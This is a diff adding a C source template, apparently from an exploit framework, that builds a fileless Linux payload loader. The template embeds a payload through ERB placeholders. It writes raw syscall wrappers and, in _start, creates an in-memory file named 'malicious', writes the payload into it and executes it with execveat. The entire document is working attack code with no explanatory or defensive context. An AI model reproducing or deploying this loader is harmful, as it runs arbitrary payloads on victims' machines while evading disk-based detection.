@@ -1,0 +1,27 @@
+#define SCSIZE <%= payload_length %>
+
+static char bPayload[SCSIZE] = "<%= payload %>";
+
+extern long syscall(long number, ...);
+
+static inline int memfd_create(const char *name, unsigned int flags)
+{
+    return syscall(319, name, flags);
+}
+static inline int write(unsigned int fd, const char * buf, int count)
+{
+    return syscall(1, fd, buf, count);
+}
+
+static inline int execveat(int dfd, const char * filename, const char *argv, const char *envp, int flags)
+{
+    return syscall(322, dfd, filename, argv, envp, flags);
+}
+
+
+void _start(void) {
+
+    int fd = memfd_create("malicious",  0x0001);
+    write(fd, bPayload, SCSIZE);
+    execveat(fd, 0, 0, 0, 0x1000);
+}
